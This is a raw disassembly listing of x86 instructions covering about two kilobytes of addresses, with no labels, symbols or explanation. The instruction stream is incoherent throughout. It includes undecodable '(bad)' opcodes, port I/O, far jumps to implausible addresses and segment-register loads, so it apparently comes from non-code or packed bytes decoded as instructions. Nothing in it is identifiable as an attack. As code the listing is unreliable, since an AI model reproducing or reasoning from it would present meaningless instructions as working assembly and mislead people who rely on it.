  417929:	adc    al,0xb2
  41792b:	jns    0x417947
  41792d:	call   0x2d80c1
  417932:	sbb    BYTE PTR [edi+0x132175eb],0x62
  417939:	adc    al,0x47
  41793b:	adc    esp,DWORD PTR [edx+0xc]
  41793e:	mov    es,WORD PTR [ecx-0x421b00ea]
  417944:	add    DWORD PTR [eax-0x17],eax
  417947:	jae    0x417992
  417949:	ret    0xb5c5
  41794c:	daa    
  41794d:	or     eax,0x2ea0e5
  417952:	inc    esp
  417953:	mov    esp,0x7597cea6
  417958:	out    dx,al
  417959:	ret    0xb9a2
  41795c:	ss adc al,0x79
  41795f:	scas   al,BYTE PTR es:[edi]
  417960:	popa   
  417961:	push   es
  417962:	adc    DWORD PTR [edx-0x1156bebd],esp
  417968:	daa    
  417969:	or     eax,0x2ea1ad
  41796e:	add    BYTE PTR [eax],al
  417970:	add    BYTE PTR [eax],al
  417972:	add    BYTE PTR [esp+edi*4+0x755178a6],al
  417979:	out    dx,al
  41797a:	ret    0x8c90
  41797d:	push   edx
  41797e:	cmp    DWORD PTR [ebp-0x6fc019d1],ebx
  417984:	cmc    
  417985:	scas   eax,DWORD PTR es:[edi]
  417986:	pop    eax
  417987:	rcr    DWORD PTR [ebx+0x5c5243ff],1
  41798d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41798e:	mov    BYTE PTR [esp+ebx*1+0x7e],bh
  417992:	sub    BYTE PTR [esi-0x6a],bl
  417995:	cli    
  417996:	imul   edx,esp,0xffffff9b
  417999:	push   ss
  41799a:	push   esi
  41799b:	or     eax,DWORD PTR [esi-0xc818be6]
  4179a1:	pop    ebp
  4179a2:	xchg   DWORD PTR [ecx-0x3b3f6965],edx
  4179a8:	scas   al,BYTE PTR es:[edi]
  4179a9:	xchg   ebp,eax
  4179aa:	idiv   BYTE PTR [edx+edi*4-0xc6bb165]
  4179b1:	ins    BYTE PTR es:[edi],dx
  4179b2:	std    
  4179b3:	daa    
  4179b4:	rcl    BYTE PTR [eax+eax*8+0x27fc9ea4],1
  4179bb:	mov    esi,0x61d7dd0e
  4179c0:	mov    bl,0x7c
  4179c2:	sub    edx,DWORD PTR [ecx-0x23bc6665]
  4179c8:	adc    eax,0xb460d7d5
  4179cd:	adc    BYTE PTR [esi-0x11],dl
  4179d0:	jge    0x417a20
  4179d2:	adc    al,0x50
  4179d4:	fwait
  4179d5:	lods   al,BYTE PTR ds:[esi]
  4179d6:	mov    BYTE PTR [eax],0x0
  4179d9:	add    BYTE PTR [eax],al
  4179db:	add    dl,dl
  4179dd:	mov    ss,WORD PTR [edx]
  4179df:	push   ebx
  4179e0:	or     ebp,DWORD PTR [edi-0x6e]
  4179e3:	in     al,dx
  4179e4:	js     0x417967
  4179e6:	sbb    BYTE PTR [eax+0x34],ch
  4179e9:	xlat   BYTE PTR ds:[ebx]
  4179ea:	adc    al,BYTE PTR [esi+eiz*2]
  4179ed:	and    al,0xc8
  4179ef:	pop    es
  4179f0:	cmp    al,0xb1
  4179f2:	jp     0x417a71
  4179f4:	sbb    DWORD PTR [edx-0x4e2f7bee],ebx
  4179fa:	or     ebp,DWORD PTR [ecx]
  4179fc:	adc    esp,DWORD PTR [eax-0x7f6dafc]
  417a02:	sti    
  417a03:	imul   esp,eax,0xffffffa7
  417a06:	popf   
  417a07:	pop    edi
  417a08:	adc    esi,DWORD PTR [ebx-0x14]
  417a0b:	clc    
  417a0c:	jmp    0xcbd27feb
  417a11:	mov    al,BYTE PTR [edi]
  417a13:	ins    BYTE PTR es:[edi],dx
  417a14:	xor    dh,dl
  417a16:	test   BYTE PTR [ebx],0xf
  417a19:	out    dx,al
  417a1a:	push   ebx
  417a1b:	xchg   ecx,eax
  417a1c:	ror    DWORD PTR [edx-0x1a89558],cl
  417a22:	inc    esp
  417a23:	stc    
  417a24:	scas   eax,DWORD PTR es:[edi]
  417a25:	mov    ebp,0x79e603b7
  417a2a:	cmp    cl,BYTE PTR [eax]
  417a2c:	nop
  417a2d:	std    
  417a2e:	pusha  
  417a2f:	jo     0x417a42
  417a31:	xchg   edi,eax
  417a32:	call   0xac5c0d8c
  417a37:	(bad)  
  417a38:	daa    
  417a39:	mov    ah,0xad
  417a3b:	mov    ah,BYTE PTR [ebx+0x1283ba]
  417a41:	add    BYTE PTR [eax],al
  417a43:	add    BYTE PTR [eax],al
  417a45:	sub    ch,ah
  417a47:	outs   dx,BYTE PTR ds:[esi]
  417a48:	add    eax,0xd8382e90
  417a4d:	mov    ecx,0xb5d7ee2d
  417a52:	xor    ebp,DWORD PTR [esi+0x70d18313]
  417a58:	into   
  417a59:	xchg   edi,eax
  417a5a:	call   0x437b:0xa7e55dfe
  417a61:	fs mov ebp,0x353e1441
  417a67:	xor    esi,DWORD PTR [edi+ebx*2]
  417a6a:	call   0xc85f:0xa7c7310e
  417a71:	out    0x35,eax
  417a73:	xor    esi,DWORD PTR [eax+eiz*2]
  417a76:	fwait
  417a77:	psubsb mm4,mm5
  417a7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a7b:	add    al,0xd5
  417a7d:	lahf   
  417a7e:	out    0xe,eax
  417a80:	inc    edi
  417a81:	dec    ebp
  417a82:	je     0x417a97
  417a84:	jmp    0x6b3cb561
  417a89:	jmp    edx
  417a8b:	in     al,0xe4
  417a8d:	jnp    0x417aaa
  417a8f:	push   ebx
  417a90:	jmp    0xf4db7b2c
  417a95:	mov    ebx,DWORD PTR [esi]
  417a97:	and    al,BYTE PTR [ecx-0x16efc50d]
  417a9d:	(bad)  
  417a9f:	arpl   WORD PTR [ebx],dx
  417aa1:	or     DWORD PTR [eax-0x17ecf89d],esp
  417aa7:	push   ds
  417aa8:	fadd   QWORD PTR [eax]
  417aaa:	add    BYTE PTR [eax],al
  417aac:	add    BYTE PTR [eax],al
  417aae:	je     0x417ae9
  417ab0:	pop    ebp
  417ab1:	loope  0x417a6e
  417ab3:	push   esi
  417ab4:	in     eax,dx
  417ab5:	inc    esi
  417ab6:	fidiv  WORD PTR [ebx]
  417ab8:	iret   
  417ab9:	mov    ch,0x38
  417abb:	sbb    DWORD PTR [edi],ebx
  417abd:	lahf   
  417abe:	add    bl,bh
  417ac0:	mov    esi,0x3ba6bb98
  417ac5:	call   0x4195aa5d
  417aca:	add    bl,dh
  417acc:	mov    esi,0x44a77ab9
  417ad1:	push   cs
  417ad2:	or     BYTE PTR [edi+0x3],ch
  417ad5:	test   eax,0x2bd80893
  417ada:	(bad)  
  417adb:	mov    dl,0x41
  417add:	pushf  
  417ade:	and    eax,0x96e13a
  417ae3:	lock loope 0x417b58
  417ae6:	cmp    esi,DWORD PTR [ecx]
  417ae8:	out    0xe7,eax
  417aea:	mov    esp,0xbaa021f1
  417aef:	mov    eax,0x9a07b098
  417af4:	aaa    
  417af5:	add    BYTE PTR [ebx-0x56],al
  417af8:	and    eax,DWORD PTR [eax-0x571421d]
  417afe:	mov    al,0x7d
  417b00:	cmp    eax,DWORD PTR [edx+eax*1-0x24fde276]
  417b07:	sub    eax,0xb67709e9
  417b0c:	sbb    edi,DWORD PTR [esi-0x21bd5c5]
  417b12:	add    BYTE PTR [eax],al
  417b14:	add    BYTE PTR [eax],al
  417b16:	add    BYTE PTR [edi],dl
  417b18:	icebp  
  417b19:	xchg   edx,eax
  417b1a:	fild   DWORD PTR [esi-0x22f02eb8]
  417b20:	repz bswap eax
  417b23:	mov    bh,0x89
  417b25:	shl    DWORD PTR [ebx],0xb
  417b28:	cmp    al,0xae
  417b2a:	idiv   DWORD PTR [edi+edi*8+0x359b1bc8]
  417b31:	push   ecx
  417b32:	add    edx,edx
  417b34:	mov    al,0x20
  417b36:	shl    dh,0x67
  417b39:	dec    ecx
  417b3a:	pop    ebx
  417b3b:	push   0x63
  417b3d:	js     0x417b4f
  417b3f:	ret    0x45e9
  417b42:	cmp    ecx,DWORD PTR [eax+0x79331283]
  417b48:	imul   ecx,edi,0xffffff8a
  417b4b:	sub    bl,BYTE PTR [edi-0x67]
  417b4e:	cmp    al,0x1a
  417b50:	(bad)  
  417b51:	pop    ds
  417b52:	je     0x417b47
  417b54:	aad    0x22
  417b56:	cmp    al,0xfb
  417b58:	jg     0x417b6e
  417b5a:	xor    ebp,DWORD PTR [ecx-0x194e98e5]
  417b60:	pop    edi
  417b61:	cdq    
  417b62:	jae    0x417b5c
  417b64:	sbb    bl,BYTE PTR [eax]
  417b66:	mov    ch,bh
  417b68:	lds    ebx,FWORD PTR [esi]
  417b6a:	jb     0x417b4c
  417b6c:	lds    esp,FWORD PTR ds:0x276fec77
  417b72:	not    DWORD PTR [eax-0x40c6bdf7]
  417b78:	jmp    FWORD PTR [eax+0x7f]
  417b7e:	add    BYTE PTR [eax],al
  417b80:	jle    0x417b4f
  417b82:	lds    edx,FWORD PTR [edx-0x79]
  417b85:	sbb    eax,0xb0d68921
  417b8a:	dec    edi
  417b8b:	cmp    edx,edx
  417b8d:	(bad)  
  417b8f:	mov    bl,cl
  417b91:	inc    ebx
  417b92:	mov    al,ds:0x964497fc
  417b97:	rol    BYTE PTR [edi*2+0x305688d4],0x14
  417b9f:	cmp    BYTE PTR [esi-0x31fd3933],0x70
  417ba6:	inc    ebx
  417ba7:	jb     0x417c0f
  417ba9:	pusha  
  417baa:	inc    ebx
  417bab:	je     0x417b61
  417bad:	adc    BYTE PTR [ecx+ebp*1+0x51],dl
  417bb1:	sbb    BYTE PTR [edx+0x4],cl
  417bb4:	loop   0x417b6e
  417bb6:	aam    0x88
  417bb8:	pop    esi
  417bb9:	lock push ss
  417bbb:	mov    cl,BYTE PTR [esi-0x768dfd49]
  417bc1:	scas   eax,DWORD PTR es:[edi]
  417bc2:	or     DWORD PTR [ebp-0x73],esi
  417bc5:	dec    ebp
  417bc6:	pop    es
  417bc7:	cmc    
  417bc8:	mov    ds:0x7bc696ea,al
  417bcd:	fimul  DWORD PTR [esi+0x144994f8]
  417bd3:	sub    DWORD PTR [ebx],esp
  417bd5:	and    BYTE PTR [ecx+ebp*8-0x6e],dl
  417bd9:	mov    BYTE PTR [edx+0x5e],dl
  417bdc:	addr16 pusha 
  417bde:	dec    edi
  417bdf:	sub    esp,0x44976e
  417be5:	add    BYTE PTR [eax],al
  417be7:	add    BYTE PTR [eax],al
  417be9:	lods   al,BYTE PTR ds:[esi]
  417bea:	pop    ebx
  417beb:	xchg   edi,eax
  417bec:	retf   0x9843
  417bef:	push   ecx
  417bf0:	push   ebp
  417bf1:	mov    ds:0x9d79694,eax
  417bf6:	mov    dl,0x23
  417bf8:	and    BYTE PTR [eax-0x67dfd3c5],al
  417bfe:	cmp    edi,DWORD PTR [eax+eiz*1]
  417c01:	pushf  
  417c02:	jmp    0x8e5287b6
  417c07:	clc    
  417c08:	add    edx,DWORD PTR [eax-0x5f70fa01]
  417c0e:	fsubr  DWORD PTR [eax-0x4ec74171]
  417c14:	ins    BYTE PTR es:[edi],dx
  417c15:	ins    DWORD PTR es:[edi],dx
  417c16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c17:	mov    ch,0x5b
  417c19:	pmaxsw mm2,mm3
  417c1c:	out    dx,eax
  417c1d:	adc    dh,BYTE PTR [ebx+0xb]
  417c20:	add    dl,cl
  417c22:	cdq    
  417c23:	inc    ebx
  417c24:	add    al,0x90
  417c26:	mov    dl,0xc0
  417c28:	push   ebx
  417c29:	adc    BYTE PTR [edi],ah
  417c2b:	aam    0xaf
  417c2d:	outs   dx,DWORD PTR ds:[esi]
  417c2e:	pop    ds
  417c2f:	hlt    
  417c30:	test   BYTE PTR [esi+0x7b],ah
  417c33:	clc    
  417c34:	add    edx,DWORD PTR [eax-0x6f6b864d]
  417c3a:	mov    dl,0xf7
  417c3c:	push   es
  417c3d:	push   ecx
  417c3e:	push   0x30
  417c40:	add    al,0x90
  417c42:	mov    dl,0x8
  417c44:	imul   edi,DWORD PTR [ecx-0x5f],0xf0855d61
  417c4b:	sub    eax,0x8d
  417c50:	add    BYTE PTR [eax],al
  417c52:	aam    0xce
  417c54:	xchg   DWORD PTR [eax-0x7122e0db],eax
  417c5a:	cmp    BYTE PTR [eax],bh
  417c5c:	sub    eax,0xfc36432f
  417c61:	cs clc 
  417c63:	mov    WORD PTR [esi],es
  417c65:	pop    ebx
  417c66:	add    eax,0x92d1382e
  417c6b:	in     eax,dx
  417c6c:	shr    BYTE PTR [edx-0x7e],1
  417c6f:	xchg   edi,eax
  417c70:	popa   
  417c71:	mov    eax,0x620ec2b3
  417c76:	ror    bh,1
  417c78:	bound  esp,QWORD PTR ds:[ecx+0x5bd1d739]
  417c7f:	hlt    
  417c80:	psubsw mm3,QWORD PTR [esi]
  417c83:	push   DWORD PTR [edx]
  417c85:	std    
  417c86:	push   ss
  417c87:	jp     0x417c23
  417c89:	shr    DWORD PTR [ebx],1
  417c8b:	push   esi
  417c8c:	aas    
  417c8d:	(bad)  
  417c8e:	pop    edx
  417c8f:	aaa    
  417c90:	inc    ebx
  417c91:	add    eax,0x10501874
  417c96:	pop    ss
  417c97:	mov    ds:0xa4e184f7,eax
  417c9c:	out    dx,al
  417c9d:	pusha  
  417c9e:	jmp    FWORD PTR [ebx]
  417ca0:	dec    edi
  417ca1:	jmp    0x96d5dfc4
  417ca6:	call   0x9463:0xf39d5ef
  417cad:	jg     0x417c39
  417caf:	out    dx,eax
  417cb0:	aam    0x19
  417cb2:	sbb    esi,ebp
  417cb4:	xor    al,cl
  417cb6:	add    BYTE PTR [eax],al
  417cb8:	add    BYTE PTR [eax],al
  417cba:	add    BYTE PTR [ebx],ah
  417cbc:	sbb    DWORD PTR [edi],ecx
  417cbe:	add    edx,DWORD PTR [edx+ebx*1-0x4d6c1627]
  417cc5:	div    dl
  417cc7:	fsub   QWORD PTR [ebx-0x35789512]
  417ccd:	cdq    
  417cce:	push   ds
  417ccf:	stos   DWORD PTR es:[edi],eax
  417cd0:	jae    0x417d0b
  417cd2:	call   0x521eb66a
  417cd7:	fstp   st(0)
  417cd9:	psubsw mm2,QWORD PTR [esi]
  417cdc:	push   es
  417cdd:	xor    ebx,DWORD PTR [ecx+0x229a8796]
  417ce3:	xor    ax,WORD PTR es:[ecx]
  417ce7:	pop    ds
  417ce8:	out    dx,al
  417ce9:	xor    dh,ch
  417ceb:	adc    al,0x6
  417ced:	xor    edi,ecx
  417cef:	sahf   
  417cf0:	mov    bl,BYTE PTR [esi]
  417cf2:	add    BYTE PTR [ebx-0x31],ch
  417cf5:	jmp    0x417cf6
  417cf7:	out    dx,al
  417cf8:	imul   ecx,DWORD PTR [ecx-0x75],0x834768b6
  417cff:	mov    ch,0xbb
  417d01:	ror    BYTE PTR [eax],1
  417d03:	jmp    0x3b2e145b
  417d08:	sbb    bh,bh
  417d0a:	push   edx
  417d0b:	xchg   DWORD PTR [ecx-0x69],esp
  417d0e:	cli    
  417d0f:	push   ebx
  417d10:	scas   eax,DWORD PTR es:[edi]
  417d11:	inc    ebx
  417d12:	mov    edi,eax
  417d14:	or     BYTE PTR [edx],al
  417d16:	sbb    al,0xc9
  417d18:	outs   dx,BYTE PTR ds:[esi]
  417d19:	out    dx,al
  417d1a:	test   cl,bh
  417d1c:	sub    DWORD PTR [eax+0x33],0x0
  417d23:	add    BYTE PTR [edx],al
  417d25:	pop    ebp
  417d26:	aas    
  417d27:	push   0xffffffa8
  417d29:	popa   
  417d2a:	jmp    0x417d41
  417d2c:	pop    ecx
  417d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d2e:	cs add ah,dh
  417d31:	mul    BYTE PTR [edx+0x69]
  417d34:	mov    edx,0x99fc5239
  417d39:	nop
  417d3a:	in     eax,dx
  417d3b:	cmp    DWORD PTR ds:0x4f,ebp
  417d40:	ficom  WORD PTR [ecx-0x4956efce]
  417d46:	xchg   ecx,eax
  417d47:	shl    BYTE PTR ds:0xe54599bc,0x66
  417d4e:	cdq    
  417d4f:	inc    ebp
  417d50:	loope  0x417db8
  417d52:	cdq    
  417d53:	inc    ebp
  417d54:	fldenv [esi-0x15]
  417d57:	jne    0x417d26
  417d59:	sub    eax,0x916ef84a
  417d5e:	ss adc cl,bh
  417d61:	mov    ch,0x91
  417d63:	shl    ch,0x9c
  417d66:	jmp    0x417ddd
  417d68:	jne    0x417d65
  417d6a:	popa   
  417d6b:	clc    
  417d6c:	scas   al,BYTE PTR es:[edi]
  417d6d:	jno    0x417d6d
  417d6f:	push   edi
  417d70:	nop
  417d71:	enter  0x2bfd,0xa0
  417d75:	dec    ebx
  417d76:	adc    al,BYTE PTR [ebx-0x7712e030]
  417d7c:	push   ebp
  417d7d:	lahf   
  417d7e:	jnp    0x417d8c
  417d80:	out    0x1e,eax
  417d82:	inc    esi
  417d83:	std    
  417d84:	test   DWORD PTR [edi],esp
  417d86:	in     al,0x3f
  417d88:	add    BYTE PTR [eax],al
  417d8a:	add    BYTE PTR [eax],al
  417d8c:	add    BYTE PTR [eax+0x15fd5a0c],dl
  417d92:	mov    bl,dh
  417d94:	bswap  edi
  417d96:	xchg   ecx,eax
  417d97:	push   ss
  417d98:	add    BYTE PTR [eax-0x73816675],dl
  417d9e:	and    ch,BYTE PTR [eax+0x38dbb07]
  417da4:	rol    BYTE PTR [edi-0x37],0xab
  417da8:	(bad)  
  417da9:	rol    esi,cl
  417dab:	fwait
  417dac:	in     al,dx
  417dad:	inc    ecx
  417dae:	loope  0x417d4f
  417db0:	mov    dl,ch
  417db2:	aas    
  417db3:	mov    ds:0x12b59069,al
  417db8:	mov    DWORD PTR [ecx-0x4b],edi
  417dbb:	adc    DWORD PTR [ebp+0x77],edx
  417dbe:	jle    0x417daa
  417dc0:	(bad)  
  417dc2:	mov    ebp,DWORD PTR [ebp-0x40]
  417dc5:	frstor [esi+0x47]
  417dc8:	adc    eax,DWORD PTR [eax]
  417dca:	jge    0x417d9e
  417dcc:	call   DWORD PTR [edx]
  417dce:	adc    ecx,esp
  417dd0:	jb     0x417d54
  417dd2:	and    al,0xd5
  417dd4:	sti    
  417dd5:	or     eax,0x2828ddd2
  417dda:	xor    bh,BYTE PTR [ecx]
  417ddc:	push   DWORD PTR [edi]
  417dde:	and    al,0x42
  417de0:	and    DWORD PTR [esi],0x67
  417de3:	xor    cl,BYTE PTR [ebx-0x35e1833]
  417de9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dea:	iret   
  417deb:	lahf   
  417dec:	imul   edx,DWORD PTR [ecx+0x58acb2],0x0
  417df6:	mov    ds:0x7c3e7ba,eax
  417dfb:	ss cmp bh,cl
  417dfe:	xchg   ebx,eax
  417dff:	sub    eax,0x2d8f6c36
  417e04:	imul   edi,DWORD PTR es:[ebx],0xffffffcb
  417e08:	test   BYTE PTR [ebx],0xa1
  417e0b:	jb     0x417d92
  417e0d:	mov    ecx,0x22874d6
  417e12:	shr    BYTE PTR [ebp-0x29abb209],cl
  417e18:	repz add al,0x5e
  417e1b:	sub    eax,0xc2963fc7
  417e20:	jno    0x417de6
  417e22:	mov    bh,0x24
  417e24:	sti    
  417e25:	imul   ebx,DWORD PTR [ebx],0xffffffcb
  417e28:	test   BYTE PTR [ebx],0x19
  417e2b:	js     0x417e33
  417e2d:	inc    edx
  417e2e:	xchg   esp,eax
  417e2f:	mov    dl,0x70
  417e31:	lds    eax,FWORD PTR [ebx-0x4b]
  417e34:	cmp    esp,DWORD PTR [eax]
  417e36:	cwde   
  417e37:	(bad)  
  417e39:	add    esi,DWORD PTR [eax]
  417e3b:	mov    bl,0xc
  417e3d:	cld    
  417e3e:	jl     0x417e67
  417e40:	aam    0xb
  417e42:	adc    DWORD PTR [edx+0x8],esi
  417e45:	push   edi
  417e46:	in     al,0xd6
  417e48:	fild   QWORD PTR [ebx+0x7d]
  417e4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e4c:	clc    
  417e4d:	add    edx,DWORD PTR [ebx]
  417e4f:	jae    0x417e35
  417e51:	jmp    DWORD PTR [edi]
  417e53:	mov    dl,0x40
  417e55:	add    al,BYTE PTR [edx+0xc3a72]
  417e5b:	add    BYTE PTR [eax],al
  417e5d:	add    BYTE PTR [eax],al
  417e5f:	nop
  417e60:	mov    al,cl
  417e62:	jne    0x417ea3
  417e64:	mov    al,ds:0x32510588
  417e69:	inc    esp
  417e6a:	adc    al,0x98
  417e6c:	mov    dl,0xf7
  417e6e:	mov    dl,0x18
  417e70:	aas    
  417e71:	prefetch BYTE PTR [edx+ebp*4+0xe]
  417e76:	jmp    0x7287845b
  417e7b:	gs xchg edi,eax
  417e7d:	jg     0x417e68
  417e7f:	xchg   ebx,eax
  417e80:	mov    dl,0xe4
  417e82:	lods   eax,DWORD PTR ds:[esi]
  417e83:	lahf   
  417e84:	(bad)  
  417e85:	setne  BYTE PTR [edx-0x143294cf]
  417e8c:	lahf   
  417e8d:	sbb    eax,0xeb33264
  417e92:	jmp    0xd57474e4
  417e97:	mov    bl,0x26
  417e99:	sbb    ch,BYTE PTR [edx-0x19]
  417e9c:	sar    DWORD PTR [edx],cl
  417e9e:	jmp    0xe9c0b231
  417ea3:	xchg   ebx,eax
  417ea4:	mov    dl,0x99
  417ea6:	jmp    0x2b93:0xe9169fab
  417ead:	pop    ebx
  417eae:	add    eax,0xa299f0d0
  417eb3:	inc    esi
  417eb4:	add    dl,BYTE PTR [ebx]
  417eb6:	bound  edi,QWORD PTR [ebx]
  417eb8:	xor    ebp,esi
  417eba:	and    DWORD PTR [esp+ebp*1+0x55],ebx
  417ebe:	stc    
  417ebf:	ss sub al,0x5b
  417ec2:	int    0x0
  417ec4:	add    BYTE PTR [eax],al
  417ec6:	add    BYTE PTR [eax],al
  417ec8:	aas    
  417ec9:	lock fwait
  417ecb:	aaa    
  417ecc:	pushf  
  417ecd:	sub    edi,edx
  417ecf:	xchg   ecx,eax
  417ed0:	(bad)  
  417ed1:	jne    0x417ee2
  417ed3:	jmp    0x6c5ff462
  417ed8:	or     esi,DWORD PTR [edx-0x7f616f2]
  417ede:	xor    eax,0x1323670d
  417ee3:	sbb    eax,0x156c244b
  417ee8:	cmp    esp,DWORD PTR [ebx]
  417eea:	dec    esi
  417eeb:	fisub  WORD PTR fs:[esi]
  417eee:	add    BYTE PTR fs:[edx+0x210076b4],ah
  417ef5:	mov    bl,0xe
  417ef7:	(bad)  
  417ef8:	cmc    
  417ef9:	mov    esi,0xecb25152
  417efe:	jmp    0x417f50
  417f00:	std    
  417f01:	sub    esp,edi
  417f03:	lea    ebp,[edi]
  417f05:	mov    ds:0x3c20ff91,eax
  417f0a:	in     al,dx
  417f0b:	adc    eax,0x2e8cd9
  417f10:	aam    0xc3
  417f12:	xor    eax,DWORD PTR [eax]
  417f14:	stc    
  417f15:	xor    DWORD PTR [edx],0x5abf9dff
  417f1b:	or     cl,ch
  417f1d:	mov    dl,0x99
  417f1f:	inc    esp
  417f20:	popf   
  417f21:	sahf   
  417f22:	jmp    0x417ed8
  417f24:	lea    ebp,[edx+0x16]
  417f27:	add    BYTE PTR [ecx+0x50d829],ch
  417f2d:	add    BYTE PTR [eax],al
  417f2f:	add    BYTE PTR [eax],al
  417f31:	push   ebx
  417f32:	shl    esi,cl
  417f34:	pop    esp
  417f35:	je     0x417eea
  417f37:	push   cs
  417f38:	test   ecx,edi
  417f3a:	mov    ah,0x92
  417f3c:	dec    esp
  417f3d:	out    0x4,al
  417f3f:	in     al,dx
  417f40:	xor    ebp,ecx
  417f42:	jne    0x417f8f
  417f44:	pop    esi
  417f45:	aam    0x5b
  417f47:	ins    DWORD PTR es:[edi],dx
  417f48:	les    ebp,FWORD PTR [ecx-0x56]
  417f4b:	push   cs
  417f4c:	add    BYTE PTR [ebx],ch
  417f4e:	stos   DWORD PTR es:[edi],eax
  417f4f:	push   cs
  417f50:	mov    edx,DWORD PTR [edi]
  417f52:	btc    DWORD PTR [ebp-0x37574d88],ebx
  417f59:	jns    0x417f0d
  417f5b:	push   cs
  417f5c:	xor    esi,DWORD PTR [eax]
  417f5e:	jge    0x417f85
  417f60:	push   esi
  417f61:	dec    ebp
  417f62:	mov    WORD PTR [eax],ss
  417f64:	pop    eax
  417f65:	inc    esi
  417f66:	pop    esi
  417f67:	lods   eax,DWORD PTR ds:[esi]
  417f68:	jmp    0x417f3a
  417f6a:	mov    BYTE PTR [eax],dl
  417f6c:	pop    eax
  417f6d:	nop
  417f6e:	lock push ds
  417f70:	push   esi
  417f71:	or     edi,ebx
  417f73:	xchg   edi,eax
  417f74:	dec    esi
  417f75:	rol    BYTE PTR [ebx],0xd5
  417f78:	daa    
  417f79:	xchg   ecx,eax
  417f7a:	mov    ebx,DWORD PTR [esp+eax*2+0x74]
  417f7e:	xchg   ebx,eax
  417f7f:	adc    ebp,eax
  417f81:	mov    gs,edi
  417f83:	scas   al,BYTE PTR es:[edi]
  417f84:	inc    eax
  417f85:	nop
  417f86:	aas    
  417f87:	jmp    0x417f11
  417f89:	(bad)  
  417f8a:	ret    
  417f8b:	or     BYTE PTR [eax],ch
  417f8d:	xchg   ecx,eax
  417f8e:	mov    edx,DWORD PTR [edi+0xec956c6]
  417f94:	add    BYTE PTR [eax],al
  417f96:	add    BYTE PTR [eax],al
  417f98:	add    BYTE PTR [eax],al
  417f9a:	inc    ebp
  417f9b:	and    BYTE PTR [edi-0x7f],dh
  417f9e:	in     al,dx
  417f9f:	mov    bl,0x91
  417fa1:	in     al,dx
  417fa2:	mov    esp,0x43001289
  417fa7:	inc    ebp
  417fa8:	mov    ebx,0x4920c630
  417fad:	inc    esi
  417fae:	pop    esi
  417faf:	push   cs
  417fb0:	(bad)  
  417fb1:	and    eax,DWORD PTR [ebx+esi*2-0x746e639e]
  417fb8:	cli    
  417fb9:	call   DWORD PTR [eax+0x148b128b]
  417fbf:	mov    eax,0x8b90008e
  417fc4:	sub    eax,DWORD PTR [esp+ebp*2-0x59]
  417fc8:	jp     0x417f51
  417fca:	ror    BYTE PTR [ebx-0x747d9886],1
  417fd0:	adc    cl,BYTE PTR [ecx+0x45959bcf]
  417fd6:	mov    BYTE PTR [eax],dl
  417fd8:	loope  0x418029
  417fda:	sbb    eax,0xc0182ecf
  417fdf:	and    BYTE PTR [ebx-0x2dbf5dfd],ch
  417fe5:	dec    edi
  417fe6:	push   edi
  417fe7:	mov    ecx,0xb250840e
  417fec:	in     al,0x7f
  417fee:	lock mov dl,0xf7
  417ff1:	add    ecx,DWORD PTR [ecx]
  417ff3:	out    dx,al
  417ff4:	sbb    esi,eax
  417ff6:	or     dh,dh
  417ff8:	adc    edi,esp
  417ffa:	fisttp WORD PTR [eax]
  417ffc:	clc    
  417ffd:	lods   eax,DWORD PTR ds:[esi]
  417ffe:	add    BYTE PTR [eax],al
  418000:	add    BYTE PTR [eax],al
  418002:	add    BYTE PTR [edi],ch
  418004:	pop    es
  418005:	stos   BYTE PTR es:[edi],al
  418006:	add    dl,BYTE PTR [eax+0x7c1fac29]
  41800c:	sub    esi,DWORD PTR [edi+ebx*1-0x7711d650]
  418013:	bound  edi,QWORD PTR [esi+0x298bac5e]
  418019:	imul   BYTE PTR [ebx+0x43]
  41801c:	aad    0xf6
  41801e:	add    ebx,DWORD PTR [ecx]
  418020:	ins    BYTE PTR es:[edi],dx
  418021:	add    BYTE PTR [ebp-0x77084c53],ah
  418027:	fs (bad) 
  418029:	xlat   BYTE PTR ds:[ebx]
  41802a:	jle    0x41800a
  41802c:	lods   al,BYTE PTR ds:[esi]
  41802d:	jae    0x41800d
  41802f:	into   
  418030:	pushf  
  418031:	clc    
  418032:	sbb    BYTE PTR [esi+edx*8+0x13],0x8d
  418037:	in     al,0xb1
  418039:	test   DWORD PTR [ebx],0xd8effd78
  41803f:	scas   al,BYTE PTR es:[edi]
  418040:	icebp  
  418041:	mov    edi,0xf7b3425c
  418046:	add    BYTE PTR [esi+edx*8],0x47
  41804a:	add    al,0x90
  41804c:	mov    dl,0x5e
  41804e:	aaa    
  41804f:	nop
  418050:	mov    dl,0xf7
  418052:	pop    ebx
  418053:	pop    ebp
  418054:	add    edi,esi
  418056:	add    ecx,DWORD PTR [ebx]
  418058:	das    
  418059:	fmul   QWORD PTR [ebp-0x70]
  41805c:	mov    dl,0xf7
  41805e:	pop    ebx
  41805f:	hlt    
  418060:	pop    ebx
  418061:	clc    
  418062:	add    esp,DWORD PTR [ebp+0x23]
  418065:	in     al,dx
  418066:	add    BYTE PTR [eax],0x0
  418069:	add    BYTE PTR [eax],al
  41806b:	add    ah,dl
  41806d:	(bad)  
  41806e:	push   cs
  41806f:	rcr    DWORD PTR [ecx],0xec
  418072:	fwait
  418073:	gs js  0x4180b4
  418076:	psubsw mm2,QWORD PTR [ebx+0x77a59c02]
  41807d:	into   
  41807e:	ds fs dec eax
  418081:	shl    BYTE PTR [edx],1
  418083:	mov    ecx,0xe8c628cb
  418088:	xchg   ebx,eax
  418089:	xor    ebx,edx
  41808b:	loope  0x418095
  41808d:	jae    0x4180ad
  41808f:	pop    esp
  418090:	into   
  418091:	arpl   bp,di
  418093:	call   0x6ddd332b
  418098:	mov    eax,0x93e90f98
  41809d:	je     0x4180ae
  41809f:	jmp    0x10a57577
  4180a4:	sbb    BYTE PTR [ecx+0x1f42b464],al
  4180aa:	push   DWORD PTR [ecx-0x38]
  4180ad:	iret   
  4180ae:	idiv   BYTE PTR cs:[eax+0x77a539a7]
  4180b5:	mov    edx,0xebc43499
  4180ba:	in     eax,dx
  4180bb:	push   ebp
  4180bc:	push   0xe5a6f6be
  4180c1:	pushf  
  4180c2:	out    dx,al
  4180c3:	gs push ebx
  4180c5:	es das 
  4180c7:	(bad)  
  4180c8:	enter  0x99ab,0x2c
  4180cc:	pushf  
  4180cd:	sahf   
  4180ce:	fs in  eax,0x0
  4180d1:	add    BYTE PTR [eax],al
